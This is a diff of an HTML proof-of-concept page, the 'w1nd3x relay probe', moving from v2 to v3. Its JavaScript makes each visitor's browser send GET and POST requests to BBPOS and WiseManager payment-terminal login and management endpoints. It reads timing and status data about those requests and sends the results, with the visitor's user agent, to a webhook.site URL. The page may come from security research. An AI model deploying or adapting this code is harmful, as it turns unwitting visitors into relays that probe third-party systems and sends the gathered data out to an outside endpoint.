@@ -1,36 +1,41 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe2</title></head>
-<body><h1>w1nd3x relay probe v2</h1><pre id="out">starting</pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe3</title></head>
+<body><h1>w1nd3x relay probe v3</h1><pre id="out">starting</pre>
 <script>
 const WH="https://webhook.site/e874bd7b-28ef-4011-b7fd-f73a0eb59565";
 const RUN=Math.random().toString(36).slice(2,8);
-const log=[];
-function rep(tag,data){ log.push([tag,data]);
-  try{ fetch(WH+"?run="+RUN+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(JSON.stringify(data).slice(0,1200)),{mode:'no-cors'}); }catch(e){}
-  document.getElementById('out').textContent=JSON.stringify(log).slice(0,4000);
+function rep(tag,data){
+  try{ fetch(WH+"?run="+RUN+"&tag="+encodeURIComponent(tag)+"&d="+encodeURIComponent(JSON.stringify(data).slice(0,1400)),{mode:'no-cors'}); }catch(e){}
+  const o=document.getElementById('out'); o.textContent+="\n"+tag+" "+JSON.stringify(data).slice(0,500);
 }
-const T=[["GET","https://developer.bbpos.com/login"],["POST","https://developer.bbpos.com/login"],
-["GET","https://tms.bbpos.com/login"],["POST","https://tms.bbpos.com/login"],
-["GET","https://portal.wisemanager.com/mdm/getLoginUrl"],["POST","https://portal.wisemanager.com/mdm/pingBackend"],
-["GET","https://bms.bbpos.com/"],["GET","https://example.com/"]];
+const T=[
+ ["GET","https://developer.bbpos.com/login"],
+ ["POST","https://developer.bbpos.com/login"],
+ ["GET","https://tms.bbpos.com/login"],
+ ["POST","https://tms.bbpos.com/login"],
+ ["GET","https://portal.wisemanager.com/mdm/getLoginUrl"],
+ ["POST","https://portal.wisemanager.com/mdm/pingBackend"],
+ ["GET","https://bms.bbpos.com/"],
+ ["GET","https://example.com/"],
+ ["GET","https://liquidsec.github.io/w1nd3x-poc/bb/?selfcontrol=1"]
+];
+function rt(u){
+  const e=performance.getEntriesByName(u);
+  if(!e.length) return null;
+  const x=e[e.length-1];
+  return {status:x.responseStatus, proto:x.nextHopProtocol, dur:Math.round(x.duration),
+          enc:x.encodedBodySize, dec:x.decodedBodySize, tx:x.transferSize};
+}
 (async()=>{
- rep("hello",{ua:navigator.userAgent,href:location.href,ts:Date.now()});
+ rep("hello",{ua:navigator.userAgent,v:3});
  for(const [m,u] of T){
-  const q=u+(u.includes('?')?'&':'?')+"w1nd3x="+RUN;
-  let t0=performance.now();
-  try{ const r=await fetch(q,{method:m,mode:'no-cors',credentials:'omit',
+  const q=u+(u.includes('?')?'&':'?')+"w1=" +RUN;
+  try{ await fetch(q,{method:m,mode:'no-cors',credentials:'omit',
        headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
-       body:m==='POST'?'w1nd3x=1':undefined});
-   rep("nocors",{m:m,u:u,type:r.type,status:r.status,ms:Math.round(performance.now()-t0)});
-  }catch(e){ rep("nocors-fail",{m:m,u:u,err:String(e).slice(0,100),ms:Math.round(performance.now()-t0)}); }
-  t0=performance.now();
-  try{ const r=await fetch(q,{method:m,mode:'cors',credentials:'omit',
-       headers:m==='POST'?{'Content-Type':'application/x-www-form-urlencoded'}:{},
-       body:m==='POST'?'w1nd3x=1':undefined});
-   const b=await r.text();
-   rep("CORS-READ",{m:m,u:u,status:r.status,len:b.length,head:b.slice(0,250)});
-  }catch(e){ rep("cors-blocked",{m:m,u:u,err:String(e).slice(0,80)}); }
+       body:m==='POST'?'w1nd3x=1':undefined}); }catch(e){}
+  await new Promise(r=>setTimeout(r,120));
+  rep("rt",{m:m,u:u,rt:rt(q)});
  }
- rep("done",{n:log.length});
- await new Promise(r=>setTimeout(r,2500));
+ rep("done",{});
+ await new Promise(r=>setTimeout(r,2000));
 })();
 </script></body></html>
